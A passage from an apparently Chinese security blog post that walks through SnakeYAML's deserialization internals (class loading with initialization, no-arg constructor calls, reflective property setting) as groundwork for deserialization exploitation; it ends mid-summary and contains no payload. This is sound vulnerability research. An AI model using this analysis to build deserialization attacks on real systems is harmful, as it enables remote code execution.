+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504174439-0mwiqld.png">
+
+<p>这个 state 属性是 Production 类型，在 ParserImpl 类中有许多内部类实现了这个接口：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250504174552-1wwl1d6.png">
+
+<p>譬如这一次处理 age 的值 18 ，</p>
+<p>好的，回到 BaseConstructor#getSingleData(Class&lt;?&gt;) 方法，随后经过一些对节点树中 tag 的操作，会调用 constructDocument 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419211943-8jyj3lh.png">
+
+<p>跟进 BaseConstructor#constructDocument(Node) ，从这个方法开始，开始将节点树转换为 Java 对象。这里通过 constructObject() 方法递归地将节点树转换为 Java 对象：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419212454-v23ebd3.png">
+
+<p>继续跟进 BaseConstructor#constructObject(Node node) 方法，这里检查当前 constructedObjects 属性中是否已经存在该节点树，如果存在则直接获取，不存在则调用 constructObjectNoCheck 方法进行处理。constructedObjects 属性是一个 Map 集合：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419212604-pocgg49.png">
+
+<p>第一次来肯定是不存在的，继续跟进 BaseConstructor#constructObjectNoCheck 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419213357-u6uqsxh.png">
+
+<p>这里首先检查当前节点是否已经在递归集合 recursiveObjects 中，如果是则抛出异常，防止无限递归。接着将节点加入递归集合 recursiveObjects ，确保后续处理能检测到循环。</p>
+<p>然后通过 getConstructor 方法获取对应的构造器，如果节点已经构建过（即存在于 constructedObjects 中），则直接取其中的数据，否则调用构造器的 construct 方法创建对象，这里相当于又检查了一遍。创建完成后，调用 finalizeConstruction 方法进行最终化处理，并将对象存入 constructedObjects 中。</p>
+<p>最后，调用 node.isTwoStepsConstruction() 判断节点是否需要两步构建，若是则调用构造器的 construct2ndStep 方法完成后续处理。</p>
+<p>那么接下来我们先跟进 BaseConstructor#getConstructor(Node) 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419214818-5gfje1c.png">
+
+<p>这里先调用 useClassConstructor 方法判断是否启用类构造器，如果是，则从 yamlClassConstructors 中根据 NodeId 获取构造器。我们可以来关注一下 useClassConstructor 方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public boolean useClassConstructor() &#123;</span><br><span class="line">    // 情况 1：显式配置了 useClassConstructor 值</span><br><span class="line">    if (useClassConstructor != null) &#123;</span><br><span class="line">        return useClassConstructor; // 直接返回预设值</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 情况 2：自动判断构造方式</span><br><span class="line">    if (!tag.isSecondary()          // 是主要标签（非本地标签）</span><br><span class="line">        &amp;&amp; resolved                 // 类型已解析</span><br><span class="line">        &amp;&amp; !Object.class.equals(type) // 非通用对象类型</span><br><span class="line">        &amp;&amp; !tag.equals(Tag.NULL)) &#123;  // 非空值</span><br><span class="line">        return true; // 使用类构造器（如自定义的 Person 类）</span><br><span class="line">    &#125; </span><br><span class="line">    else if (tag.isCompatible(getType())) &#123; </span><br><span class="line">        // 标签与类型兼容（如 Tag.STR 对应 String.class）</span><br><span class="line">        return true; // 优先使用类构造器</span><br><span class="line">    &#125; </span><br><span class="line">    else &#123;</span><br><span class="line">        return false; // 使用标签驱动的构造器</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>默认情况下返回 false ，返回 false 的话接下来就去 yamlConstructors 中根据 Tag 来获取构造器。这里第一次获取到的其实也是 null ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250419220332-zz12lr6.png">
+
+<p>接下来会根据前缀来从 yamlMultiConstructors 中获取多态构造器。当 YAML 标签使用 Java 类全路径时（如 !com.example.Shape），可以通过注册前缀 “!com.example.” 来统一处理该包下的所有子类。</p>
+<p>最后，如果以上方法都未获取到，会调用 yamlConstructors.get 来获取。参数为 null 。</p>
+<p>yamlConstructors 是一个 HashMap 对象，也就是说，最后会从 yamlConstructors 取一个键为 null 的值，我们可以看看这个值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420141744-swssji2.png">
+
+<p>所以我们最终获取到的构造器就是这个 org.yaml.snakeyaml.constructor.Constructor 中的内部类 ConstructYamlObject 。那么这部分逻辑就分析完了，回到 BaseConstructor#constructObjectNoCheck ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420143151-p9hrlv5.png">
+
+<p>接下来判断 constructedObjects 中是否已存在 node 对应的数据，如果有就直接拿，没有就用刚刚获取的构造器构造一个。这里因为第一次来 ，constructedObjects 中是没有该值的，故而直接调用构造器的 construct 方法。</p>
+<p>跟进 Constructor$ConstructYamlObject#construct(Node) ，这里会先调用本类的 getConstructor 方法获取构造器，然后调用 construct 方法来构造：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420144737-lm30pvw.png">
+
+<p>继续跟进 Constructor$ConstructYamlObject#getConstructor(Node) ，这里会先调用 getClassForNode 方法根据节点树获取对应的 class 对象：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420144847-vms5fv8.png">
+
+<p>跟进 Constructor#getClassForNode(Node) ，这个方法根据节点树获取对应的目标类，是一个关键方法。该方法首先会在 typeTags 中查找是否已经有 Tag -&gt; Class 的映射，然后获取。如果没有的话调用 getClassForName 根据类名来获取 Class 对象，最后将 Tag -&gt; Class 的映射加入进 typeTags 中 ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420145845-ei2je9j.png">
+
+<p>跟进 Constructor#getClassForName(String)，这里面直接进行类加载：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420170204-1ahgl98.png">
+
+<p>这里 Class.forName 的第二个参数为 true，表示初始化类，会经过类加载的全部五个阶段，会执行 person 类的静态代码块。</p>
+<p>好的，回到 Constructor$ConstructYamlObject#getConstructor(Node) ，此时我们已经获取到这个 Class 对象（Person 类），将这个对象设置进 node 节点树的 type 属性中，然后从 yamlClassConstructors 中根据 NodeId 来获取构造器，最后这里获取到的是一个 Constructor$ConstructMapping 对象 ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420173444-svoekjs.png">
+
+<p>好的，回到 Constructor$ConstructYamlObject#construct(Node) ，获取到构造器以后会调用它的 construct 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420173759-2jqm3er.png">
+
+<p>跟进 Constructor$ConstructMapping#construct(Node) ，这里会首先判断 node.getType() 是否是 Map 或 Collection 类型，若是则单独调用 constructMapping 或 constructSet 方法进行构造。由于我们的 node.getType() 是自定义的 Person 类型，所以会走到最后调用 Constructor.this.newInstance ：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420174240-916rvf4.png">
+
+<p>该方法中每次都使用 isTwoStepsConstruction() 进行判断，根据注解，它用来指示此节点是否需要分两步构造。当节点是自身（直接或间接）的子节点时，必须使用两步构造。即当使用锚点和别名构建递归结构时。该标记由 Composer 组件设置，仅在反序列化加载过程中使用。</p>
+<p>接下来跟进 BaseConstructor#newInstance(Node) ，这里直接调用两参重构方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420191618-fuz3fs9.png">
+
+<p>跟进 BaseConstructor#newInstance(Class&lt;?&gt;, Node)，这里调用三参重构方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420191714-jh4mhag.png">
+
+<p>继续跟进 BaseConstructor#newInstance(Class&lt;?&gt;, Node, boolean) ，最终在这里进行构造方法的调用。type.getDeclaredConstructor() 获取目标类的构造方法，这里目标类就是我们的 Person 类，随后实例化对象，这里就会执行类的无参构造方法，是反序列化链的触发点之一：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250420192340-n5f5l95.png">
+
+<p>这里只是调用了无参构造方法，类的各属性是如何赋值的呢？回到 Constructor$ConstructMapping#construct(Node) ，接下来会调用 constructJavaBean2ndStep 方法</p>
+<p>我们跟进 Constructor$ConstructMapping#constructJavaBean2ndStep(MappingNode, Object) ，属性赋值就在这里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 构造JavaBean的第二步处理（属性赋值阶段）</span><br><span class="line"> * </span><br><span class="line"> * @param node 映射节点，包含键值对信息</span><br><span class="line"> * @param object 第一步创建的JavaBean空实例</span><br><span class="line"> * @return 完成属性赋值的JavaBean</span><br><span class="line"> */</span><br><span class="line">protected Object constructJavaBean2ndStep(MappingNode node, Object object) &#123;</span><br><span class="line">    // 扁平化处理嵌套的映射结构</span><br><span class="line">    flattenMapping(node);</span><br><span class="line">    // 获取目标JavaBean的类型信息和节点值列表</span><br><span class="line">    Class&lt;? extends Object&gt; beanType = node.getType();</span><br><span class="line">    List&lt;NodeTuple&gt; nodeValue = node.getValue();</span><br><span class="line">    </span><br><span class="line">    // 遍历所有键值对节点</span><br><span class="line">    for (NodeTuple tuple : nodeValue) &#123;</span><br><span class="line">        // 键节点必须是标量节点（ScalarNode）</span><br><span class="line">        ScalarNode keyNode;</span><br><span class="line">        if (tuple.getKeyNode() instanceof ScalarNode) &#123;</span><br><span class="line">            keyNode = (ScalarNode) tuple.getKeyNode();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new YAMLException(&quot;Keys must be scalars but found: &quot; + tuple.getKeyNode());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        // 处理值节点并构造键对象</span><br><span class="line">        Node valueNode = tuple.getValueNode();</span><br><span class="line">        keyNode.setType(String.class);  // 强制键为String类型</span><br><span class="line">        String key = (String) constructObject(keyNode);</span><br><span class="line">        </span><br><span class="line">        try &#123;</span><br><span class="line">            // 获取类型定义和对应的属性元数据</span><br><span class="line">            TypeDescription memberDescription = typeDefinitions.get(beanType);</span><br><span class="line">            Property property = memberDescription == null </span><br><span class="line">                ? getProperty(beanType, key)  // 默认属性查找</span><br><span class="line">                : memberDescription.getProperty(key);  // 使用类型定义中的属性</span><br><span class="line"></span><br><span class="line">            // 校验属性可写性</span><br><span class="line">            if (!property.isWritable()) &#123;</span><br><span class="line">                throw new YAMLException(&quot;No writable property &#x27;&quot; + key + &quot;&#x27; on class: &quot; + beanType.getName());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 设置值节点的预期类型</span><br><span class="line">            valueNode.setType(property.getType());</span><br><span class="line">            // 检测并处理泛型类型信息</span><br><span class="line">            final boolean typeDetected = (memberDescription != null)</span><br><span class="line">                    ? memberDescription.setupPropertyType(key, valueNode)</span><br><span class="line">                    : false;</span><br><span class="line">            </span><br><span class="line">            // 如果没有显式类型定义且是非标量节点，处理集合类型泛型</span><br><span class="line">            if (!typeDetected &amp;&amp; valueNode.getNodeId() != NodeId.scalar) &#123;</span><br><span class="line">                Class&lt;?&gt;[] arguments = property.getActualTypeArguments();</span><br><span class="line">                if (arguments != null &amp;&amp; arguments.length &gt; 0) &#123;</span><br><span class="line">                    // 根据集合类型设置泛型参数</span><br><span class="line">                    if (valueNode.getNodeId() == NodeId.sequence) &#123;</span><br><span class="line">                        // 处理List类型泛型</span><br><span class="line">                        Class&lt;?&gt; t = arguments[0];</span><br><span class="line">                        SequenceNode snode = (SequenceNode) valueNode;</span><br><span class="line">                        snode.setListType(t);</span><br><span class="line">                    &#125; else if (Set.class.isAssignableFrom(valueNode.getType())) &#123;</span><br><span class="line">                        // 处理Set类型泛型</span><br><span class="line">                        Class&lt;?&gt; t = arguments[0];</span><br><span class="line">                        MappingNode mnode = (MappingNode) valueNode;</span><br><span class="line">                        mnode.setOnlyKeyType(t);</span><br><span class="line">                        mnode.setUseClassConstructor(true);</span><br><span class="line">                    &#125; else if (Map.class.isAssignableFrom(valueNode.getType())) &#123;</span><br><span class="line">                        // 处理Map类型泛型</span><br><span class="line">                        Class&lt;?&gt; keyType = arguments[0];</span><br><span class="line">                        Class&lt;?&gt; valueType = arguments[1];</span><br><span class="line">                        MappingNode mnode = (MappingNode) valueNode;</span><br><span class="line">                        mnode.setTypes(keyType, valueType);</span><br><span class="line">                        mnode.setUseClassConstructor(true);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 构造值对象（优先使用类型定义中的构造方式）</span><br><span class="line">            Object value = (memberDescription != null)</span><br><span class="line">                    ? newInstance(memberDescription, key, valueNode)</span><br><span class="line">                    : constructObject(valueNode);</span><br><span class="line">            </span><br><span class="line">            // 类型转换处理</span><br><span class="line">            // Double -&gt; Float 类型适配</span><br><span class="line">            if (property.getType() == Float.TYPE || property.getType() == Float.class) &#123;</span><br><span class="line">                if (value instanceof Double) &#123;</span><br><span class="line">                    value = ((Double) value).floatValue();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            // byte[] -&gt; String 类型适配（处理二进制标签）</span><br><span class="line">            if (property.getType() == String.class </span><br><span class="line">                    &amp;&amp; Tag.BINARY.equals(valueNode.getTag())</span><br><span class="line">                    &amp;&amp; value instanceof byte[]) &#123;</span><br><span class="line">                value = new String((byte[]) value);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 设置属性值（优先使用类型定义的设置方式）</span><br><span class="line">            if (memberDescription == null || !memberDescription.setProperty(object, key, value)) &#123;</span><br><span class="line">                property.set(object, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (DuplicateKeyException e) &#123;</span><br><span class="line">            throw e;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // 封装构造异常信息</span><br><span class="line">            throw new ConstructorException(</span><br><span class="line">                    &quot;Cannot create property=&quot; + key + &quot; for JavaBean=&quot; + object,</span><br><span class="line">                    node.getStartMark(), e.getMessage(), valueNode.getStartMark(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里设置属性值是调用了 property.set(object, value)，property 在前面赋值的语句为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Property property = memberDescription == null ? getProperty(beanType, key)</span><br><span class="line">                            : memberDescription.getProperty(key);</span><br></pre></td></tr></table></figure>
+
+<p>这里我们跟进 Constructor#getProperty(Class&lt;? extends Object&gt;, String)，可以发现这里面实际调用了 PropertyUtils 的 getProperty(Class&lt;? extends Object&gt;, String) 方法：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250505103004-zrbasc3.png">
+
+<p>而这个方法其实最后也会调用到 PropertyUtils#getPropertiesMap(Class&lt;?&gt;, BeanAccess)，我们在序列化的时候分析过（<strong>它会将 public 属性设置为 FieldProperty ，非 public 但有 getter 或 setter 方法的属性设置为 MethodProperty</strong>）。</p>
+<p>那么后续调用 property.set(object, value) ，对于 FieldProperty 来说，调用 <code>FieldProperty#set(Object, Object)</code>​ 方法，通过 <code>java.lang.reflect.Field#set</code>​ 进行反射赋值：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250422234843-skf6aoh.png">
+
+<p>而对于 MethodProperty ，调用 <code>MethodProperty#set(Object, Object) </code>​方法，通过 <code>java.beans.PropertyDescriptor#getWriteMethod()</code>​ 来获取 setter 方法并执行：</p>
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/images/image-20250422232413-36r7xp7.png">
+
+<p>至此，分析完毕。</p>
+<h4 id="调用链总结-1"><a href="#调用链总结-1" class="headerlink" title="调用链总结"></a>调用链总结</h4><p>我们总结一下前面的调用链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Yaml#load(String) # 将 Yaml 数据反序列化为 Java 对象</span><br><span class="line">Yaml#loadFromReader(StreamReader, Class&lt;?&gt;)</span><br><span class="line">BaseConstructor#getSingleData(Class&lt;?&gt;)</span><br><span class="line">	-&gt; Composer#getSingleNode() # 分支1：构建节点树</span><br><span class="line">	   Composer#getNode()</span><br><span class="line">	   Composer#composeNode(Node) # 构建节点树</span><br><span class="line">	-&gt; BaseConstructor#constructDocument(Node) # 分支2：将节点树转换为 Java 对象</span><br><span class="line">	   BaseConstructor#constructObject(Node)</span><br><span class="line">	   BaseConstructor#constructObjectNoCheck(Node)</span><br><span class="line">	       -&gt; BaseConstructor#getConstructor(Node) # 获取构造器 ConstructYamlObject </span><br><span class="line">		   -&gt; Constructor$ConstructYamlObject#construct(Node) </span><br><span class="line">			      -&gt; Constructor$ConstructYamlObject#getConstructor(Node)</span><br><span class="line">					 Constructor#getClassForNode(Node) </span><br><span class="line">	                 Constructor#getClassForName(String) # 类加载</span><br><span class="line">				  -&gt; Constructor$ConstructMapping#construct(Node)</span><br><span class="line">					 	-&gt; BaseConstructor#newInstance(Node)</span><br><span class="line">					 	   BaseConstructor#newInstance(Class&lt;?&gt;, Node)</span><br><span class="line">					 	   BaseConstructor#newInstance(Class&lt;?&gt;, Node, boolean) # 调用无参构造方法</span><br><span class="line">						-&gt; Constructor$ConstructMapping#constructJavaBean2ndStep(MappingNode, Object) # 属性赋值</span><br><span class="line">						       -&gt; Constructor#getProperty(Class&lt;? extends Object&gt;, String)</span><br><span class="line">								  PropertyUtils#getProperty(Class&lt;? extends Object&gt;, String)</span><br><span class="line">								  PropertyUtils#getProperty(Class&lt;? extends Object&gt;, String, BeanAccess)</span><br><span class="line">								  PropertyUtils#getPropertiesMap(Class&lt;?&gt;, BeanAccess)</span><br><span class="line">								  # public 属性设置为 